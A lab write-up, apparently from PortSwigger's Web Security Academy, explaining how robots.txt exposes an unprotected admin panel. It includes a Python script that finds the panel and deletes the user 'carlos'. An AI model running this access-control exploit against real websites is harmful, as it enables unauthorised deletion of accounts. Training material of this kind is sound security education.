# Lab: Unprotected admin functionality

 This lab has an unprotected admin panel.

Solve the lab by deleting the user `carlos`.

---

We search for the `robots.txt` file:  
![image](https://github.com/user-attachments/assets/3b376178-5266-485d-9738-af00b1640f2a)

We navigate to the `administrator-panel` and find that there is no access control in place. The panel provides options to delete users. We click on `carlos - Delete` and solve the lab:  
![image](https://github.com/user-attachments/assets/f63d27dc-dda9-4e41-a238-fd6bd37755ec)

---

# Exploit

```python
from bs4 import BeautifulSoup
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = "https://0a2200f603ee15fea792e6e6009a004a.web-security-academy.net"

robots_url = url + "/robots.txt"
robots_content = requests.get(robots_url, verify=False, proxies=proxies)

disallows = [line.split(': ')[1] for line in robots_content.text.splitlines() if line.startswith('Disallow')]
admin_url = url + disallows[0]
admin_panel = requests.get(admin_url, verify=False, proxies=proxies)

soup = BeautifulSoup(admin_panel.text, 'html.parser')
delete_link = soup.find('a', href=lambda href: href and 'delete' in href)
delete_url = delete_link['href']
delete_url = delete_url.replace('wiener', 'carlos')

delete_panel = requests.get(url + delete_url, verify=False, proxies=proxies)

if "User deleted successfully!" in delete_panel.text:
    print("User deleted successfully!")
```
